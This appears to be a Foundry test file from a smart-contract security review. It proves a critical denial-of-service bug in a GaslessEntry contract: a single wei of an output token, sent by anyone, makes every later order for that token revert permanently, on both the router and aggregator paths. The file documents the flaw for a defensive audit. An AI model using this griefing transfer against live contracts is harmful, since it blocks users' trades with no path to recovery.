// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {ReviewBase, console2} from "./ReviewBase.sol";
import {GaslessEntry} from "../../src/v2/GaslessEntry.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// R-01  CRITICAL  Permanent, unauthenticated denial of service of GaslessEntry.
///
/// `fill()` ends every output with:
///     safeTransfer(owner, outs[i]);
///     if (token.balanceOf(address(this)) != 0) revert DustLeftBehind(...);
///
/// The check assumes the contract's balance of an output token is always exactly what this fill
/// produced. Nothing enforces that. An ERC20 balance can be increased by anybody at any time, the
/// contract has no owner, no sweep and no rescue, and the check is a hard revert placed AFTER the
/// user's funds have already been pulled. One wei of the output token, sent by anyone, makes every
/// subsequent order for that token revert forever.
contract R01_DustDoS is ReviewBase {
    function setUp() public {
        _baseSetUp([KYBER_ROUTER, address(0), address(0), address(0)]);
    }

    function test_R01_oneWeiOfAaplBricksEveryAaplOrderForever() public {
        // 1. A normal order fills today.
        uint256 amt = 1000e6;
        uint256 fee = 1e6;
        deal(USDG, user, amt);
        GaslessEntry.Order memory o1 = _buyOrder(amt, 5e6, 0, bytes32(uint256(1)));
        vm.prank(relayer);
        uint256[] memory outs = entry.fill(o1, _auth(o1), _routerRoute(amt - fee), fee);
        assertGt(outs[0], 0, "control fill should work");

        // 2. Anyone sends one wei of AAPL to the entry contract. No approval, no privilege.
        deal(AAPL, attacker, 1);
        vm.prank(attacker);
        IERC20(AAPL).transfer(address(entry), 1);
        assertEq(IERC20(AAPL).balanceOf(address(entry)), 1, "griefing transfer did not land");

        // 3. Every later AAPL order reverts, for every user, at every size, forever.
        deal(USDG, user, amt);
        GaslessEntry.Order memory o2 = _buyOrder(amt, 5e6, 0, bytes32(uint256(2)));
        GaslessEntry.Auth memory a2 = _auth(o2);
        vm.prank(relayer);
        vm.expectRevert(abi.encodeWithSelector(GaslessEntry.DustLeftBehind.selector, AAPL, 1));
        entry.fill(o2, a2, _routerRoute(amt - fee), fee);

        // 4. There is no recovery path: no owner, no sweep, no admin selector.
        bytes memory code = address(entry).code;
        assertFalse(_hasSelector(code, bytes4(keccak256("owner()"))), "unexpected owner()");
        assertFalse(_hasSelector(code, bytes4(keccak256("sweep(address)"))), "unexpected sweep()");
        assertFalse(_hasSelector(code, bytes4(keccak256("rescue(address,uint256)"))), "unexpected rescue()");
        assertEq(IERC20(AAPL).balanceOf(address(entry)), 1, "the wei is still there");
    }

    /// The same one wei also bricks the aggregator path, so a relayer cannot route around it.
    function test_R01_dustAlsoBricksTheAggregatorPath() public {
        uint256 amt = 500e6;
        deal(AAPL, attacker, 1);
        vm.prank(attacker);
        IERC20(AAPL).transfer(address(entry), 1);

        deal(USDG, user, amt);
        GaslessEntry.Order memory o = _buyOrder(amt, 5e6, 0, bytes32(uint256(3)));
        GaslessEntry.Auth memory a = _auth(o);
        GaslessEntry.Route memory r =
            GaslessEntry.Route({aggregator: KYBER_ROUTER, callData: hex"deadbeef", aggMinOut: 0, legs: _legs1(0, amt - 1e6)});
        vm.prank(relayer);
        vm.expectRevert(abi.encodeWithSelector(GaslessEntry.DustLeftBehind.selector, AAPL, 1));
        entry.fill(o, a, r, 1e6);
    }

    /// A single order may not name the same output token twice: the second output's proceeds are
    /// already in the contract when the first output's dust check runs. Same root cause.
    function test_R01_duplicateOutputTokenIsUnfillable() public {
        uint256 amt = 1000e6;
        deal(USDG, user, amt);
        GaslessEntry.Order memory o = _buyOrder(amt, 5e6, 0, bytes32(uint256(4)));
        GaslessEntry.Output[] memory outs = new GaslessEntry.Output[](2);
        outs[0] = o.outputs[0];
        outs[0].weightBps = 5_000;
        outs[1] = o.outputs[0];
        outs[1].weightBps = 5_000;
        o.outputs = outs;

        GaslessEntry.Auth memory a = _auth(o);
        GaslessEntry.Route memory r = _routerRoute((amt - 1e6) / 2);
        vm.prank(relayer);
        vm.expectRevert(); // DustLeftBehind on the first leg of the pair
        entry.fill(o, a, r, 1e6);
    }

    function _hasSelector(bytes memory code, bytes4 sel) internal pure returns (bool) {
        for (uint256 i = 0; i + 4 <= code.length; i++) {
            if (code[i] == sel[0] && code[i + 1] == sel[1] && code[i + 2] == sel[2] && code[i + 3] == sel[3]) {
                return true;
            }
        }
        return false;
    }
}
